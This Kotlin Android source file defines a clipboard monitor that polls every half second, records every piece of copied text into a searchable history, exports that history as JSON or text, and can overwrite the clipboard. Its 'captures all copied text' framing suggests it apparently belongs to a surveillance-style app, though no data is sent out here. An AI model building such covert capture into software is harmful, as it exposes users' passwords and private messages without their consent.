package com.sync.xxx.managers

import android.content.ClipData
import android.content.ClipboardManager as AndroidClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * ClipboardManager.kt
 * Monitor and manipulate clipboard content
 * Captures all copied text
 */
class ClipboardManager(private val context: Context) {

    private val TAG = "ClipboardManager"
    
    private val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as AndroidClipboardManager
    private val clipboardHistory = ConcurrentLinkedQueue<ClipboardEntry>()
    private val handler = Handler(Looper.getMainLooper())
    
    private var isMonitoring = false
    private var clipboardListener: ((ClipboardEntry) -> Unit)? = null
    private var lastClipText: String = ""
    
    // Polling interval in milliseconds
    private val pollingInterval = 500L
    private val maxHistorySize = 500

    /**
     * Start monitoring clipboard
     * @param listener Optional listener for clipboard changes
     */
    fun startMonitoring(listener: ((ClipboardEntry) -> Unit)? = null) {
        if (isMonitoring) {
            Log.w(TAG, "Already monitoring")
            return
        }

        clipboardListener = listener
        isMonitoring = true
        
        // Get initial clipboard content
        lastClipText = getCurrentClipText()
        
        // Start polling
        startPolling()
        
        Log.d(TAG, "Clipboard monitoring started")
    }

    /**
     * Stop monitoring clipboard
     */
    fun stopMonitoring() {
        if (!isMonitoring) {
            return
        }

        isMonitoring = false
        handler.removeCallbacksAndMessages(null)
        clipboardListener = null
        
        Log.d(TAG, "Clipboard monitoring stopped")
    }

    /**
     * Start polling clipboard
     */
    private fun startPolling() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isMonitoring) {
                    checkClipboard()
                    handler.postDelayed(this, pollingInterval)
                }
            }
        }, pollingInterval)
    }

    /**
     * Check clipboard for changes
     */
    private fun checkClipboard() {
        try {
            val currentText = getCurrentClipText()
            
            if (currentText.isNotEmpty() && currentText != lastClipText) {
                val entry = ClipboardEntry(
                    timestamp = System.currentTimeMillis(),
                    text = currentText,
                    type = getClipType()
                )
                
                addEntry(entry)
                lastClipText = currentText
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking clipboard", e)
        }
    }

    /**
     * Get current clipboard text
     */
    fun getCurrentClipText(): String {
        return try {
            if (clipboardManager.hasPrimaryClip()) {
                val clip = clipboardManager.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val item = clip.getItemAt(0)
                    item.text?.toString() ?: ""
                } else {
                    ""
                }
            } else {
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting clipboard text", e)
            ""
        }
    }

    /**
     * Get clipboard content type
     */
    private fun getClipType(): String {
        return try {
            if (clipboardManager.hasPrimaryClip()) {
                val clip = clipboardManager.primaryClip
                clip?.description?.getMimeType(0) ?: "text/plain"
            } else {
                "text/plain"
            }
        } catch (e: Exception) {
            "text/plain"
        }
    }

    /**
     * Add clipboard entry
     */
    private fun addEntry(entry: ClipboardEntry) {
        clipboardHistory.add(entry)
        clipboardListener?.invoke(entry)
        
        // Auto-trim history if too large
        if (clipboardHistory.size > maxHistorySize) {
            val excess = clipboardHistory.size - (maxHistorySize / 2)
            repeat(excess) {
                clipboardHistory.poll()
            }
            Log.d(TAG, "History overflow, removed $excess old entries")
        }
    }

    /**
     * Get current clipboard content
     */
    fun getCurrentClip(): String {
        return getCurrentClipText()
    }

    /**
     * Set clipboard content
     */
    fun setClipboard(text: String) {
        try {
            val clip = ClipData.newPlainText("label", text)
            clipboardManager.setPrimaryClip(clip)
            Log.d(TAG, "Clipboard set: ${text.take(50)}")
        } catch (e: Exception) {
            Log.e(TAG, "Error setting clipboard", e)
        }
    }

    /**
     * Clear clipboard
     */
    fun clearClipboard() {
        try {
            val clip = ClipData.newPlainText("", "")
            clipboardManager.setPrimaryClip(clip)
            Log.d(TAG, "Clipboard cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing clipboard", e)
        }
    }

    /**
     * Get all clipboard history
     */
    fun getAllHistory(): List<ClipboardEntry> {
        return clipboardHistory.toList()
    }

    /**
     * Get history within time range
     */
    fun getHistoryInTimeRange(startTime: Long, endTime: Long): List<ClipboardEntry> {
        return clipboardHistory.filter { it.timestamp in startTime..endTime }
    }

    /**
     * Search history by text
     */
    fun searchHistory(query: String): List<ClipboardEntry> {
        return clipboardHistory.filter { 
            it.text.contains(query, ignoreCase = true) 
        }
    }

    /**
     * Clear history
     */
    fun clearHistory() {
        clipboardHistory.clear()
        Log.d(TAG, "History cleared")
    }

    /**
     * Get history as JSON
     */
    fun getHistoryAsJson(): JSONArray {
        val jsonArray = JSONArray()
        clipboardHistory.forEach { entry ->
            jsonArray.put(entry.toJson())
        }
        return jsonArray
    }

    /**
     * Export history to string
     */
    fun exportHistory(): String {
        val sb = StringBuilder()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        clipboardHistory.forEach { entry ->
            sb.append("=".repeat(60)).append("\n")
            sb.append("Time: ${dateFormat.format(Date(entry.timestamp))}\n")
            sb.append("Type: ${entry.type}\n")
            sb.append("Text: ${entry.text}\n")
        }
        
        return sb.toString()
    }

    /**
     * Get history size
     */
    fun getHistorySize(): Int = clipboardHistory.size

    /**
     * Check if monitoring is active
     */
    fun isMonitoring(): Boolean = isMonitoring

    /**
     * Cleanup resources
     */
    fun cleanup() {
        stopMonitoring()
    }

    /**
     * Data class for clipboard entry
     */
    data class ClipboardEntry(
        val timestamp: Long,
        val text: String,
        val type: String
    ) {
        fun toJson(): JSONObject {
            return JSONObject().apply {
                put("timestamp", timestamp)
                put("text", text)
                put("type", type)
                put("date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
            }
        }
    }
}
